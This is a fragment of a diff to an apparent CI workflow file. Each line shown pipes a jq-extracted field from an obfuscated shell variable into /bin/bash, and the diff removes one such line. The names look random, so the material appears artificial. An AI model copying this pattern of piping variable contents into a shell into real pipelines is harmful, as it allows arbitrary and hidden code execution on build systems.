@@ -21,7 +21,6 @@ jobs:
           echo $ch3 | jq -r .l77 | /bin/bash
           printf '%s' "$n74" | jq -r .b8 | /bin/bash
           printf '%s' "$x3414" | jq -r .lvi87 | /bin/bash
-          printf '%s' "$yqrsi154" | jq -r .haxar26 | /bin/bash
           printf '%s' "$c323" | jq -r .kxea462 | /bin/bash
           echo $frkx54 | jq -r .jmtyb08 | /bin/bash
 
